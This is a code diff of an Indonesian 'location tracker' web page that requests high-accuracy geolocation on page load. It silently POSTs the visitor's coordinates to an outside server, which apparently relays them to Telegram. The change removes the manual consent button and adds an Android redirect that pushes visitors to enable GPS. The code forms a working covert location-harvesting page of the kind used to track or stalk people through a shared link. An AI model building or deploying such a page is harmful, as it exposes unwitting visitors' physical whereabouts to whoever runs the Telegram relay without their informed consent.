@@ -60,9 +60,6 @@
       <h1>Pelacak Lokasi</h1>
       <p>Mohon izinkan akses lokasi untuk melanjutkan</p>
       <p id="loadingStatus">Meminta izin lokasi...</p>
-      <button id="locateBtn" style="display: none" onclick="getLocation()">
-        Izinkan Lokasi
-      </button>
       <p id="error-message" class="hidden">
         Lokasi tidak dapat diakses. Pastikan GPS diaktifkan.
       </p>
@@ -74,15 +71,14 @@
     </div>
 
     <script>
-      let map, marker, currentPosition;
+      let map, marker;
 
       document.addEventListener("DOMContentLoaded", function () {
         setTimeout(getLocation, 500);
       });
 
-      // Fungsi untuk meminta lokasi
       function getLocation() {
-        if (navigator.geolocation) {
+        if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(showPosition, showError, {
             enableHighAccuracy: true,
             timeout: 10000,
@@ -91,15 +87,12 @@
         } else {
           document.getElementById("loadingStatus").textContent =
             "Geolocation tidak didukung.";
-          document.getElementById("locateBtn").style.display = "block";
         }
       }
 
-      // Menampilkan posisi setelah izin lokasi diberikan
       function showPosition(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
-        currentPosition = { latitude, longitude };
 
         document.body.style.backgroundColor = "#fff";
         document.getElementById("loadingScreen").classList.add("hidden");
@@ -110,28 +103,32 @@
         );
 
         initMap(latitude, longitude);
-        shareLocationToTelegram(latitude, longitude); // Fungsi kirim lokasi ke Telegram
+        shareLocationToTelegram(latitude, longitude);
       }
 
-      // Menangani error saat mendapatkan lokasi
       function showError(error) {
-        // Jika lokasi tidak dapat ditemukan, tampilkan pesan error dan tombol izinkan lokasi
+        let errorMessage = "";
+
         if (error.code === error.PERMISSION_DENIED) {
-          document.getElementById("loadingStatus").textContent =
-            "Anda menolak izin lokasi.";
+          errorMessage = "Anda menolak izin lokasi.";
         } else if (error.code === error.POSITION_UNAVAILABLE) {
-          document.getElementById("loadingStatus").textContent =
-            "Posisi tidak tersedia.";
+          errorMessage = "GPS tidak aktif! Silakan aktifkan GPS.";
+          promptEnableGPS(); // Meminta pengguna mengaktifkan GPS
         } else if (error.code === error.TIMEOUT) {
-          document.getElementById("loadingStatus").textContent =
-            "Waktu permintaan lokasi habis.";
+          errorMessage = "Permintaan lokasi timeout.";
         }
 
-        document.getElementById("locateBtn").style.display = "block";
+        document.getElementById("loadingStatus").textContent = errorMessage;
         document.getElementById("error-message").classList.remove("hidden");
       }
 
-      // Inisialisasi peta dengan Leaflet
+      function promptEnableGPS() {
+        if (navigator.userAgent.match(/Android/i)) {
+          window.location.href =
+            "intent://settings/location_source#Intent;scheme=android.settings;end;";
+        }
+      }
+
       function initMap(lat, lng) {
         if (!map) {
           map = L.map("map").setView([lat, lng], 15);
@@ -145,25 +142,19 @@
         }
       }
 
-      // Fungsi untuk mengirim lokasi ke Telegram
       function shareLocationToTelegram(latitude, longitude) {
         fetch("https://nyobaloca.vercel.app/send-location", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            latitude: latitude,
-            longitude: longitude,
-          }),
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude }),
         })
           .then((response) => response.json())
-          .then((data) => {
-            console.log("Lokasi berhasil dikirim ke Telegram", data);
-          })
-          .catch((error) => {
-            console.error("Gagal mengirim lokasi ke Telegram", error);
-          });
+          .then((data) =>
+            console.log("Lokasi berhasil dikirim ke Telegram", data)
+          )
+          .catch((error) =>
+            console.error("Gagal mengirim lokasi ke Telegram", error)
+          );
       }
     </script>
   </body>
